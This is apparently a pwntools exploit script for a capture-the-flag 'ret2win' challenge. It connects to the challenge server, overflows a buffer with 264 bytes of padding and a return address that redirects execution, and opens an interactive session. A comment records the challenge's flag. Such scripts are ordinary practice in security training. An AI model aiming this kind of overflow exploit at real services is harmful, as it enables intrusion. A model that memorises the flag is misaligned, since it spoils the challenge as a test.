from pwn import *
# flag = 'ingehack{it_all_started_like_this}'
host = 'ret2win.ctf.ingeniums.club'
port = 1337
p = remote(host, port, ssl=True)

p.recvuntil(b'got> ')
offset = 256+8
payload=b"A"*offset + p64(0x000000000040123d)
p.sendline(payload)
p.recvuntil(b'')
p.interactive()